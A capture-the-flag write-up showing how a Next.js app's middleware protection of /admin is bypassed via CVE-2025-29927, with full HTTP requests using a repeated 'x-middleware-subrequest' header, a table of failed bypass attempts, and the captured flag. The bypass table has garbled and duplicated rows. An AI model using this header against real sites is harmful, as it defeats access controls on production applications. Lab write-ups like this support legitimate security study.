# Corrupt Middleware

**Category:** Web  
**Points:** 400  
**Description** Something about a corrupt middleware, terminals and guardians. What is going on?

## TL;DR

- The application is built on **Next.js** with middleware protecting the `/admin` route
- Accessing `/admin` results in a **307 redirect** back to `/`, enforced by the middleware
- The middleware is vulnerable to **CVE-2025-29927**, a critical Next.js authorization bypass
- Sending the `x-middleware-subrequest` header with repeated `middleware` values tricks Next.js into skipping middleware execution
- The unprotected `/admin` page reveals the flag

### Step 1: Initial Reconnaissance

Opening the challenge URL in the browser and examining the response in **Burp Suite's HTTP history** reveals the application is powered by **Next.js**.

**Request:**

```http
GET / HTTP/2
Host: poiuytrewqazxc-csc26.cybersecuritychallenge.al
```

**Response headers:**

```http
HTTP/2 200 OK
x-powered-by: Next.js
x-nextjs-cache: HIT
```

Viewing the page source in the browser shows several important hints:

- `"ADMIN CONSOLE LOCKED"` — there's an admin page somewhere
- `"MIDDLEWARE GUARDIAN ACTIVE"` — middleware is protecting it
- `"ACCESS TERMINAL: /"` — hints at a route to explore
- `"Flag awaits the worthy."` — the flag is behind the protection

I noticed references to `/_next/` static assets, indicating this is a Next.js application. Checking the build manifest by navigating to `/_next/static/K7pgFjrDw82KKN3X5jSDA/_buildManifest.js` in Burp's Repeater:

```javascript
self.__BUILD_MANIFEST = {
  __rewrites: { afterFiles: [], beforeFiles: [], fallback: [] },
  "/_error": ["static/chunks/pages/_error-7ba65e1336b92748.js"],
  sortedPages: ["/_app", "/_error"],
};
```

This confirms the app uses the **App Router** (not Pages Router), as routes aren't listed in `_buildManifest.js`.

### Step 2: Discovering the Protected Route

Trying to access `/admin` directly in the browser automatically redirects back to the home page. Intercepting this request in **Burp Suite** reveals what's happening:

**Request:**

```http
GET /admin HTTP/2
Host: poiuytrewqazxc-csc26.cybersecuritychallenge.al
```

**Response:**

```http
HTTP/2 307 Temporary Redirect
location: /
```

The middleware intercepts the request and issues a **307 Temporary Redirect** back to `/`. Testing other paths like `/api` and `/terminal` in Burp's Repeater returns standard 404 pages.
Using **Burp Repeater**, I tested several common Next.js middleware bypass techniques by modifying the request to `/admin`:

| Technique         | Modification                             | Result       |
| ----------------- | ---------------------------------------- | ------------ |
| Path traversal    | Changed path to `/_next/../admin`        | 307 redirect |
| Prefetch header   | Added header: `x-middleware-prefetch: 1` | 307 redirect |
| Invoke path       | Added header: `x-invoke-path: /admin`    | 307 redirect |
| Simple subrequest | Added header:\_next/../admin`            | 307 redirect |
| Prefetch header   | `x-middleware-prefetch: 1`               | 307 redirect |
| Invoke path       | `x-invoke-path: /admin`                  | 307 redirect |
| Simple subrequest | `x-middleware-subrequest: middleware`    | 307 redirect |

None of these worked — the middleware was still actively blocking access.

### Step 4: Exploiting CVE-2025-29927

The challenge name "Corrupt Middleware" and the theme of a "guardian" strongly hint at **CVE-2025-29927** — a critical Next.js authorization bypass vulnerability. The exploit requires sending the `x-middleware-subrequest` header with the middleware filename repeated multiple times to exceed the recursion limit.

In **Burp Repeater**, I modified the request to `/admin` and added the malicious header:

**Request:**

```http
GET /admin HTTP/2
Host: poiuytrewqazxc-csc26.cybersecuritychallenge.al
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

**Response:**

```http
HTTP/2 200 OK
x-powered-by: Next.js
x-nextjs-cache: HIT
```

Viewing the response in **Burp Repeater**, the admin page was now accessible with the flag clearly displayedned **200 OK** instead of a 307 redirect.

### Step 5: Capturing the Flag

The response body contained the admin page with the flag:

```html
<h1 class="pixel-text pixel-glow">ADMIN CONSOLE UNLOCKED</h1>
<p class="pixel-text">
  SYSTEM BREACH DETECTED?<br />
  FLAG RETRIEVED:
</p>
<div class="flag-text">
  CSC26{ca7d061f0fad47e0e4c27fc98311337f25deef6146ca6daf0e854f757c0a1a0f}
</div>
<p class="pixel-text">
  DEBUG MODE: ACTIVE<br />
  MIDDLEWARE BYPASSED?
</p>
```

**Flag:** `CSC26{ca7d061f0fad47e0e4c27fc98311337f25deef6146ca6daf0e854f757c0a1a0f}`
